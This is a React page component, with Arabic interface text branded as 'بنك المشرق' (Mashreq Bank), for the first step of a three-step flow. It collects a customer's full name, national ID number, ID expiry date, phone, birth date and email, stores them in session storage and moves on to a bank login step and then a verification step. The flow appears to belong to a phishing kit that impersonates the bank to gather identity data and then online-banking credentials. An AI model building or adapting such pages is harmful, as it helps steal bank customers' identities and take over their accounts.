import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { ArrowLeft, ChevronRight } from "lucide-react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

export default function PersonalDataPage() {
  const [, navigate] = useLocation();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    fullName: "",
    nationalId: "",
    idExpiryDate: "",
    phoneNumber: "",
    birthDate: "",
    email: "",
    username: "",
    password: "",
  });

  const createOrderMutation = trpc.orders.create.useMutation();

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    // التحقق من الرقم القومي (14 رقم فقط)
    if (name === "nationalId" && value.length > 14) {
      return;
    }

    setFormData(prev => ({
      ...prev,
      [name]: value,
    }));
  };

  const validateForm = () => {
    if (!formData.fullName.trim()) {
      toast.error("يرجى إدخال الاسم الكامل");
      return false;
    }
    if (formData.nationalId.length !== 14) {
      toast.error("الرقم القومي يجب أن يكون 14 رقم");
      return false;
    }
    if (!formData.idExpiryDate) {
      toast.error("يرجى إدخال تاريخ انتهاء الهوية");
      return false;
    }
    if (!formData.phoneNumber.trim()) {
      toast.error("يرجى إدخال رقم الهاتف");
      return false;
    }
    if (!formData.birthDate) {
      toast.error("يرجى إدخال تاريخ الميلاد");
      return false;
    }
    if (!formData.email.trim() || !formData.email.includes("@")) {
      toast.error("يرجى إدخال بريد إلكتروني صحيح");
      return false;
    }
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;

    setLoading(true);
    try {
      // سيتم الانتقال إلى صفحة تسجيل الدخول لإدخال username و password
      sessionStorage.setItem("personalData", JSON.stringify(formData));
      navigate("/order/login");
      return;


    } catch (error) {
      console.error("Error:", error);
      toast.error("فشل إنشاء الطلب");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-accent/10" dir="rtl">
      {/* الهيدر */}
      <header className="header-nav sticky top-0 z-40">
        <div className="container flex items-center justify-between">
          <h1 className="text-2xl font-bold text-accent">بنك المشرق</h1>
          <Button
            variant="ghost"
            onClick={() => navigate("/")}
            className="gap-2"
          >
            <ArrowLeft className="w-4 h-4" />
            العودة
          </Button>
        </div>
      </header>

      {/* محتوى الصفحة */}
      <div className="container py-12">
        <div className="max-w-2xl mx-auto">
          {/* شريط التقدم */}
          <div className="mb-8">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-2">
                <div className="w-8 h-8 rounded-full bg-accent text-white flex items-center justify-center font-bold text-sm">
                  1
                </div>
                <span className="font-semibold">البيانات الشخصية</span>
              </div>
              <ChevronRight className="w-5 h-5 text-muted-foreground" />
              <div className="flex items-center gap-2 opacity-50">
                <div className="w-8 h-8 rounded-full bg-muted text-muted-foreground flex items-center justify-center font-bold text-sm">
                  2
                </div>
                <span className="font-semibold">تسجيل الدخول</span>
              </div>
              <ChevronRight className="w-5 h-5 text-muted-foreground" />
              <div className="flex items-center gap-2 opacity-50">
                <div className="w-8 h-8 rounded-full bg-muted text-muted-foreground flex items-center justify-center font-bold text-sm">
                  3
                </div>
                <span className="font-semibold">التحقق</span>
              </div>
            </div>
            <div className="h-1 bg-muted rounded-full overflow-hidden">
              <div className="h-full w-1/3 bg-accent transition-all duration-300"></div>
            </div>
          </div>

          {/* النموذج */}
          <Card className="p-8">
            <h2 className="text-3xl font-bold mb-2">البيانات الشخصية</h2>
            <p className="text-muted-foreground mb-8">
              يرجى إدخال بياناتك الشخصية بدقة
            </p>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="form-group">
                <Label htmlFor="fullName" className="form-label">
                  الاسم الكامل *
                </Label>
                <Input
                  id="fullName"
                  name="fullName"
                  value={formData.fullName}
                  onChange={handleInputChange}
                  placeholder="أدخل اسمك الكامل"
                  className="input-field"
                  required
                />
              </div>

              <div className="grid grid-cols-1  gap-6">
                <div className="form-group">
                  <Label htmlFor="nationalId" className="form-label">
                    الرقم القومي (14 رقم) *
                  </Label>
                  <Input
                    id="nationalId"
                    name="nationalId"
                    type="number"
                    value={formData.nationalId}
                    onChange={handleInputChange}
                    placeholder="أدخل رقمك القومي"
                    className="input-field"
                    required
                    maxLength={14}
                  />
                </div>

                <div className="form-group">
                  <Label htmlFor="idExpiryDate" className="form-label">
                    تاريخ انتهاء الهوية *
                  </Label>
                  <Input
                    id="idExpiryDate"
                    name="idExpiryDate"
                    type="date"
                    value={formData.idExpiryDate}
                    onChange={handleInputChange}
                    className="input-field"
                    required
                  />
                </div>
              </div>

              <div className="grid grid-cols-1  gap-6">
                <div className="form-group">
                  <Label htmlFor="phoneNumber" className="form-label">
                    رقم الهاتف *
                  </Label>
                  <Input
                    id="phoneNumber"
                    name="phoneNumber"
                    type="tel"
                    value={formData.phoneNumber}
                    onChange={handleInputChange}
                    placeholder="أدخل رقم هاتفك"
                    className="input-field"
                    required
                  />
                </div>

                <div className="form-group">
                  <Label htmlFor="birthDate" className="form-label">
                    تاريخ الميلاد *
                  </Label>
                  <Input
                    id="birthDate"
                    name="birthDate"
                    type="date"
                    value={formData.birthDate}
                    onChange={handleInputChange}
                    className="input-field"
                    required
                  />
                </div>
              </div>

              <div className="form-group">
                <Label htmlFor="email" className="form-label">
                  البريد الإلكتروني *
                </Label>
                <Input
                  id="email"
                  name="email"
                  type="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  placeholder="أدخل بريدك الإلكتروني"
                  className="input-field"
                  required
                />
              </div>

              <div className="flex gap-4 pt-6">
                <Button
                  type="button"
                  variant="outline"
                  onClick={() => navigate("/")}
                  className="flex-1"
                >
                  إلغاء
                </Button>
                <Button
                  type="submit"
                  className="flex-1 button-primary"
                  disabled={loading}
                >
                  {loading ? "جاري المعالجة..." : "التالي"}
                </Button>
              </div>
            </form>
          </Card>
        </div>
      </div>
    </div>
  );
}
